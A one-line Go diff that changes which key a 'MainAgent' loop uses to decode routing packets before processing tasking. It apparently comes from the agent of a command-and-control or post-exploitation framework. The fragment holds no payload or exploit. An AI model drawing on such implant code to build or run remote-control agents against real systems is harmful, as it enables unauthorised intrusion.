@@ -152,7 +152,7 @@ func (ma *MainAgent) Run() {
 				continue
 			} else {
 
-				packet, _ := ma.PacketHandler.DecodeRoutingPacket(data, ma.encryptionKey, ma.sessionID)
+				packet, _ := ma.PacketHandler.DecodeRoutingPacket(data, ma.PacketHandler.StagingKey, ma.sessionID)
 				ma.processTasking(packet)
 			}
 		}
